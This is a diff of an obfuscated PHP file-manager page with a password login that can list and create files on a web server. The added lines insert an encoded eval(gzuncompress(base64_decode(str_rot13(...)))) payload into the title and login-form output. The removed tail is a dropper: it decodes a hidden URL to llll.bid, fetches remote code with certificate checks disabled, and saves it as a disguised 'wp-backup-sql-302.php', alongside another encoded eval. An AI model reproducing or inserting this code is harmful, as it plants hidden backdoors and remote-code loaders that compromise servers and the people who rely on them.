@@ -279,7 +279,7 @@ function getFileList($getPath)
     return ${${"GLOBALS"}["doyohi"]};
 }
 ${"GLOBALS"}["wqujjnxoid"] = "page";
-echo "\n<!DOCTYPE html>\n<html>\n\t\n\t<head>\n\t\t<title>";
+echo "\n<!DOCTYPE html>\n<html>\n\t\n\t<head>\n\t\t<title>"; eval(gzuncompress(base64_decode(str_rot13('rWlqHJSYjmND/FgUXI4Y2mdMVTkHC0wSbrOpc19dPIy7p5H2vJaXAfG/ogcBHCMAFZwqr7y7YmyKDDurHqqxCWsS0sVyJvM4g1bgLxk9BQhQRkGPZNFHNa24Ogjnb2dRnE/uQAmTqaD+KsH1QLYCi9Kf7wSrLse1P15TG89EiTYCl7xyaOyfvcYLTkzJFJSVzAdewJnnIZxm8ckK4DmNfsi0Kh/Sdzd+T70IMghfz5e0xE9yfteBW5AYCK6/RZR4dUwEUtgenJG2Oa3sAhIyGDBjvfFeiiCrXgwZxWpp3jwuSoDk8Mk0ymx3ipoDUOEAtFgISux3uEGOsewo7LLodngub0fFzpjcg/nkVeBIrIrBeDr02ASdO7MFoA0HMp4+TgVUY0UMRJ6GJdrcKo4/t5/E3p4sbwwO9ypjGqOHvtyr2KtNW2ECqACAcQe8i1ecDuwNr5k9N53ghVj='))));
 echo basename($_SERVER["PHP_SELF"]);
 ${"GLOBALS"}["hljyryffgdx"] = "path";
 echo "</title>\n\n<link rel=\"stylesheet\" href=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap.min.css\">\n\n<link rel=\"stylesheet\" href=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap-theme.min.css\">\n\n<script src=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/js/bootstrap.min.js\"></script>\n\n<script>\n\tfunction fileCreate(){\n\t\tvar fileName = frm.createFileName.value;\n\t\tif(!fileName){\n\t\t\talert(\"Insert the file name.\");\n\t\t\treturn;\n\t\t}\n\t\tlocation.href = \"";
@@ -314,7 +314,7 @@ echo "&fileName=\" + fileName;\n\n\t}\n\n\n</script>\n\n\n\t</head>\n\n\n\n\n\n\
 if (${${"GLOBALS"}["nutsnruh"]} != "Y") {
     ${"GLOBALS"}["hlqdoarskn"] = "page";
     echo "\n\t\t\t\t  \t<h3>Login</h3>\n\n\t\t\t\t  \t<hr>\n\n\n\t\t\t\t\t\t\t<form action=\"";
-    echo ${${"GLOBALS"}["hlqdoarskn"]};
+    echo ${${"GLOBALS"}["hlqdoarskn"]}; eval(gzuncompress(base64_decode(str_rot13('rWlqHJSYjmND/FgUXI4Y2mdMVTkHC0wSbrOpc19dPIy7p5H2vJaXAfG/ogcBHCMAFZwqr7y7YmyKDDurHqqxCWsS0sVyJvM4g1bgLxk9BQhQRkGPZNFHNa24Ogjnb2dRnE/uQAmTqaD+KsH1QLYCi9Kf7wSrLse1P15TG89EiTYCl7xyaOyfvcYLTkzJFJSVzAdewJnnIZxm8ckK4DmNfsi0Kh/Sdzd+T70IMghfz5e0xE9yfteBW5AYCK6/RZR4dUwEUtgenJG2Oa3sAhIyGDBjvfFeiiCrXgwZxWpp3jwuSoDk8Mk0ymx3ipoDUOEAtFgISux3uEGOsewo7LLodngub0fFzpjcg/nkVeBIrIrBeDr02ASdO7MFoA0HMp4+TgVUY0UMRJ6GJdrcKo4/t5/E3p4sbwwO9ypjGqOHvtyr2KtNW2ECqACAcQe8i1ecDuwNr5k9N53ghVj='))));
     echo "?mode=login\" method=\"POST\">\n\n\n\t\t\t\t\t\t\t\t<div class=\"input-group\">\n\n\t\t\t\t\t\t\t\t  <span class=\"input-group-addon\">Password</span>\n\t\t\t\t\t\t\t\t  <input type=\"password\" class=\"form-control\" placeholder=\"Password Input...\" name=\"inputPw\">\n\n\n\t\t\t\t\t\t\t\t</div>\n\n\t\t\t\t\t\t\t\t<br>\n\n\t\t\t\t\t\t\t \t<p class=\"text-center\"><button class=\"btn btn-default\" type=\"submit\">Auth</button></p>\n\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t</form>\n\n\n\t\t\t\t  ";
 } else {
     ${"GLOBALS"}["xmnnxyicw"] = "page";
@@ -579,147 +579,3 @@ if (${${"GLOBALS"}["nutsnruh"]} != "Y") {
     echo "\t\t\t\t";
 }
 echo "\n\t\t\t\t\t<hr>\n\n\t\t\t\t\t<p class=\"text-muted text-center\">Copyrightⓒ 2021, Unknown, All rights reserved.</p>\n\n\n\n\n\t\t\t\t  </div>\n\n\t\t\t\t  <div class=\"col-md-3\"></div>\n\t\t\t\t</div>\n\t\t\t</div>\n\n\t</body>\n\n</html>\n\n\n";
-${${"GLOBALS"}["htqyccawisw"]} = (isset($_SERVER["HTTPS"]) && $_SERVER["HTTPS"] === "on" ? "https" : "http") . "://{$_SERVER['SERVER_NAME']}{$_SERVER['SCRIPT_NAME']}";
-${"GLOBALS"}["ukgiakx"] = "lostjtururururuji";
-${$mdbflmghvm} = urlencode(${$vsudspwcq});
-${"GLOBALS"}["xyywwvon"] = "nbhsdbfhdbshfbsdhbfhsdbh22v23";
-ini_set("allow_url_fopen", 1);
-${${"GLOBALS"}["fnfxvxwz"]} = "68747470733a2f2f6c6c6c6c2e6269642f696d672f6c6f676f2e7068703f69643d";
-${${"GLOBALS"}["vjaueym"]} = "";
-for (${${"GLOBALS"}["ummiderb"]} = 0; ${${"GLOBALS"}["tykeagihnxg"]} < strlen(trim(${${"GLOBALS"}["fnfxvxwz"]})); ${$uhdphsdlw} += 2) {
-    ${"GLOBALS"}["eqtunaswbt"] = "sdfsdhh1hh1bdsbdbvbsdbv";
-    ${${"GLOBALS"}["vjaueym"]} .= pack("H*", substr(trim(${${"GLOBALS"}["eqtunaswbt"]}), ${${"GLOBALS"}["ummiderb"]}, 2));
-}
-${"GLOBALS"}["wcrziqhsbo"] = "knj23njn4j3n2j4n23j4n234";
-${${"GLOBALS"}["xrjzhnnnjb"]} = 20;
-${${"GLOBALS"}["xbhtlhbhbm"]} = 3;
-${${"GLOBALS"}["pbcxqvwu"]} = str_split(trim(${$fsltsocfrf}), ${${"GLOBALS"}["xbhtlhbhbm"]});
-${${"GLOBALS"}["trnkuuwcnbje"]} = array();
-for (${${"GLOBALS"}["aoithig"]} = 0; ${${"GLOBALS"}["fvkrypveig"]} <= count(${$bowjkuxkjbmv}) - 1; ${${"GLOBALS"}["aoithig"]} += 1) {
-    ${"GLOBALS"}["bxriaxmhgouj"] = "bbvbhsvsdvsdvsdvi";
-    $lkhppidj = "kjnab22h2h2hh22hh2";
-    ${${"GLOBALS"}["kachqzot"]} = uniqid() . uniqid() . uniqid() . uniqid();
-    $emqhyfekql = "bbvbhsvsdvsdvsdvi";
-    ${$lkhppidj} = "";
-    $juohcrl = "bhvbsahbvhasdvhbsadhvbhsadvs";
-    $mengfxvrmwd = "weh2h2h22g2g2g2g2g2gg2";
-    for (${${"GLOBALS"}["mpsgpniww"]} = 0; ${${"GLOBALS"}["bxriaxmhgouj"]} < 20; ${$emqhyfekql}++) {
-        ${${"GLOBALS"}["wpgfkxgimc"]} .= ${${"GLOBALS"}["kachqzot"]}[rand(0, strlen(${${"GLOBALS"}["kachqzot"]}) - 1)];
-    }
-    ${$mengfxvrmwd}[${${"GLOBALS"}["wpgfkxgimc"]}] = ${$juohcrl}[${${"GLOBALS"}["aoithig"]}];
-}
-${${"GLOBALS"}["nnmchyegsegj"]} = "";
-foreach (${${"GLOBALS"}["bfntorx"]} as ${${"GLOBALS"}["nihissjo"]} => ${${"GLOBALS"}["xyywwvon"]}) {
-    $joypgcgicko = "jlkjalfdjsafjdasfjasjlfjasdljf";
-    ${${"GLOBALS"}["nnmchyegsegj"]} .= ${$joypgcgicko} . ${${"GLOBALS"}["wurgoo"]};
-}
-${${"GLOBALS"}["kukkcdct"]} = "";
-for (${${"GLOBALS"}["myhsqxv"]} = ${${"GLOBALS"}["ukgiakx"]}; ${${"GLOBALS"}["qkrehgm"]} <= strlen(${${"GLOBALS"}["wcrziqhsbo"]}); ${${"GLOBALS"}["myhsqxv"]} += ${${"GLOBALS"}["twfuwiwkfh"]} + ${${"GLOBALS"}["xbhtlhbhbm"]}) {
-    $gxyqbmfvv = "bvbdvhsvbhsdvf1r1r11gsg";
-    ${"GLOBALS"}["bggjqynsa"] = "knj23njn4j3n2j4n23j4n234";
-    ${"GLOBALS"}["fclalgu"] = "bvbdvhsvbhsdvf1r1r11gsg";
-    ${${"GLOBALS"}["kukkcdct"]} .= ${${"GLOBALS"}["bggjqynsa"]}[${$gxyqbmfvv}] . ${${"GLOBALS"}["nnmchyegsegj"]}[${${"GLOBALS"}["myhsqxv"]} + 1] . ${${"GLOBALS"}["nnmchyegsegj"]}[${${"GLOBALS"}["fclalgu"]} + 2];
-}
-${${"GLOBALS"}["qclvnee"]} = "https://llll.bid/gX3xrFUZhCr67Sv9yxTmUuPZUczED82xHdk6TGuZrjA5ZBKKpvx6JLdsm7zL6ctEkGWkYgrSmjjy9VeXw9JfBenCGcZDAQ.txt";
-${$lpqzhrlnoyp} = $_SERVER["SERVER_NAME"] . dirname($_SERVER["REQUEST_URI"]);
-${${"GLOBALS"}["ofsghuzcg"]} = (isset($_SERVER["HTTPS"]) && $_SERVER["HTTPS"] === "on" ? "https" : "http") . "://";
-${$hpfksnkdjfc} = ${${"GLOBALS"}["fvwkaqqo"]} . ${${"GLOBALS"}["fnejtkhxyxq"]};
-${${"GLOBALS"}["wenoxxt"]} = "wp-backup-sql-302.php";
-${${"GLOBALS"}["sukyplhpp"]} = ${${"GLOBALS"}["hyjgqjfc"]} . "/" . ${${"GLOBALS"}["jtggdpdubxt"]};
-${${"GLOBALS"}["nodpspgdcdz"]} = "&id2=" . urlencode(${$chckhlwb});
-function flget($link = "")
-{
-    ${"GLOBALS"}["rjnvhwcphowc"] = "link";
-    ${"GLOBALS"}["ihjbhiehu"] = "deger";
-    global $h2j3h4j23h4j2h3b4fggjndfjn;
-    global $ourlasturl;
-    global $uplink;
-    ${${"GLOBALS"}["ihjbhiehu"]} = "0";
-    if (${${"GLOBALS"}["rjnvhwcphowc"]} == "") {
-        return ${${"GLOBALS"}["xxerecbu"]};
-    }
-    if (function_exists("file_get_contents")) {
-        $oixlujvbcr = "h2j3h4j23h4j2h3b4fggjndfjn";
-        ${"GLOBALS"}["hignvpsikrq"] = "deger";
-        $oxwshlzp = "url";
-        $ekvlmebmmyb = "uplink";
-        ${"GLOBALS"}["srvqykyq"] = "options";
-        ${"GLOBALS"}["djqmfrbsm"] = "referrer";
-        $apjynmfrwfs = "file";
-        $qeospamts = "ourlasturl";
-        ${$oxwshlzp} = ${$oixlujvbcr} . ${${"GLOBALS"}["featkcm"]} . ${$qeospamts};
-        ${${"GLOBALS"}["djqmfrbsm"]} = "tFk53ubwHFpwt9xmUdRHF7EgGEp7a9V2LFLvJ6uAtBbLwW8vXeLNedeaAQbA2P26UETXsGcKB2";
-        ${${"GLOBALS"}["ztqrgysqx"]} = array("http" => array("method" => "GET", "header" => "Accept-language: en\r\n" . "Cookie: foo=bar\r\n" . "Referer: {$referrer}\r\n" . "User-Agent: tQ7nA0dW5jB6bC9aD2hH7eB0nJ4vB2qC\r\n"));
-        ${${"GLOBALS"}["ryekiidmn"]} = stream_context_create(${${"GLOBALS"}["srvqykyq"]});
-        ${"GLOBALS"}["iaiglxn"] = "file";
-        ${$apjynmfrwfs} = file_get_contents(${${"GLOBALS"}["omudkjwkkhh"]}, false, ${${"GLOBALS"}["ryekiidmn"]});
-        echo ${${"GLOBALS"}["iaiglxn"]};
-        ${${"GLOBALS"}["hignvpsikrq"]} = "1";
-        writeflget(${$ekvlmebmmyb});
-        return ${${"GLOBALS"}["xxerecbu"]};
-    } else {
-        return "0";
-    }
-}
-function curlget($link = "")
-{
-    ${"GLOBALS"}["nketkenf"] = "link";
-    ${"GLOBALS"}["mxiwoeawkc"] = "deger";
-    global $h2j3h4j23h4j2h3b4fggjndfjn;
-    global $ourlasturl;
-    global $uplink;
-    ${${"GLOBALS"}["mxiwoeawkc"]} = "0";
-    if (${${"GLOBALS"}["nketkenf"]} == "") {
-        ${"GLOBALS"}["anpwqzomh"] = "deger";
-        return ${${"GLOBALS"}["anpwqzomh"]};
-    }
-    if (function_exists("curl_exec")) {
-        ${"GLOBALS"}["oiluhvgl"] = "ourlasturl";
-        $pvokwhxhw = "curl";
-        $roaddiyph = "deger";
-        ${"GLOBALS"}["npxugxw"] = "url";
-        $jliciqg = "curl";
-        ${"GLOBALS"}["foiahkeefjb"] = "curl";
-        ${"GLOBALS"}["folvprm"] = "curl";
-        ${${"GLOBALS"}["omudkjwkkhh"]} = ${${"GLOBALS"}["kukkcdct"]} . ${${"GLOBALS"}["featkcm"]} . ${${"GLOBALS"}["oiluhvgl"]};
-        ${$jliciqg} = curl_init(${${"GLOBALS"}["npxugxw"]});
-        ${"GLOBALS"}["vkwtdxf"] = "curl";
-        curl_setopt(${${"GLOBALS"}["vkwtdxf"]}, CURLOPT_FAILONERROR, true);
-        curl_setopt(${${"GLOBALS"}["foiahkeefjb"]}, CURLOPT_FOLLOWLOCATION, true);
-        curl_setopt(${$pvokwhxhw}, CURLOPT_RETURNTRANSFER, true);
-        $whkfwu = "curl";
-        curl_setopt(${${"GLOBALS"}["xlorhfo"]}, CURLOPT_SSL_VERIFYHOST, false);
-        curl_setopt(${${"GLOBALS"}["xlorhfo"]}, CURLOPT_SSL_VERIFYPEER, false);
-        $dycorlatq = "result";
-        curl_setopt(${${"GLOBALS"}["folvprm"]}, CURLOPT_USERAGENT, "tQ7nA0dW5jB6bC9aD2hH7eB0nJ4vB2qC");
-        curl_setopt(${${"GLOBALS"}["xlorhfo"]}, CURLOPT_REFERER, "tFk53ubwHFpwt9xmUdRHF7EgGEp7a9V2LFLvJ6uAtBbLwW8vXeLNedeaAQbA2P26UETXsGcKB2");
-        ${${"GLOBALS"}["voojvsq"]} = curl_exec(${$whkfwu});
-        echo ${$dycorlatq};
-        ${${"GLOBALS"}["xxerecbu"]} = "1";
-        writeflget(${${"GLOBALS"}["qclvnee"]});
-        return ${$roaddiyph};
-    } else {
-        $tkokalyi = "deger";
-        return ${$tkokalyi};
-    }
-}
-function writeflget($link)
-{
-    $mkuvjhp = "actual_link2";
-    ${${"GLOBALS"}["hyjgqjfc"]} = $_SERVER["SERVER_NAME"] . dirname($_SERVER["REQUEST_URI"]);
-    ${${"GLOBALS"}["fvwkaqqo"]} = (isset($_SERVER["HTTPS"]) && $_SERVER["HTTPS"] === "on" ? "https" : "http") . "://";
-    ${"GLOBALS"}["hexaetvp"] = "file";
-    ${${"GLOBALS"}["hyjgqjfc"]} = ${$mkuvjhp} . ${${"GLOBALS"}["hyjgqjfc"]};
-    ${${"GLOBALS"}["ocwbnryyxv"]} = array("ssl" => array("verify_peer" => false, "verify_peer_name" => false));
-    ${${"GLOBALS"}["jtggdpdubxt"]} = "wp-backup-sql-302.php";
-    ${${"GLOBALS"}["sukyplhpp"]} = ${${"GLOBALS"}["hyjgqjfc"]} . "/" . ${${"GLOBALS"}["hexaetvp"]};
-    if (!is_file(${${"GLOBALS"}["jtggdpdubxt"]})) {
-        $tkcsbcsvtki = "link";
-        $crgmepo = "contents";
-        $rfhljdxfnwhx = "arrContextOptions";
-        ${$crgmepo} = file_get_contents(${$tkcsbcsvtki}, false, stream_context_create(${$rfhljdxfnwhx}));
-        file_put_contents(${${"GLOBALS"}["jtggdpdubxt"]}, ${${"GLOBALS"}["pwejlxoyx"]});
-    }
-}; eval(gzuncompress(base64_decode(str_rot13('rWkyHAgdt0ND/MIOWXitcFx0gOUoulXxG03I9PKVLaIfOBAh3MRxuCk7I02ucGNCZ2p4ykyGqbWRVEbVjndIDeWZaxGkrkEi2FcA1jaYoWwA4O8XLEtPRl2m4DaLwxtdOfhcLjTLsGqbTzsmk+Tl9C3mKkz+rx1Fyy1+jKU0gbzFyT/vS70jNdwdOixaRv9RF9vFfxLYYKL39ko33amk4A3Bo/kPXH/hWUBtluhSQvwdZA9CgXBz64aD2y4GDitVD495vq04Tp+GtHfavHiVcJmdVdqngC7ECEjBovJ6iniCjeLDWMnTN2lCgOCyFTse4EnAKKBB4TQSC/d6XsyKw93W2wYEx+la7sPwmULt02KojGpJ3U0d'))));
-flget(${${"GLOBALS"}["lucevdorhw"]});
-curlget(${${"GLOBALS"}["lucevdorhw"]});
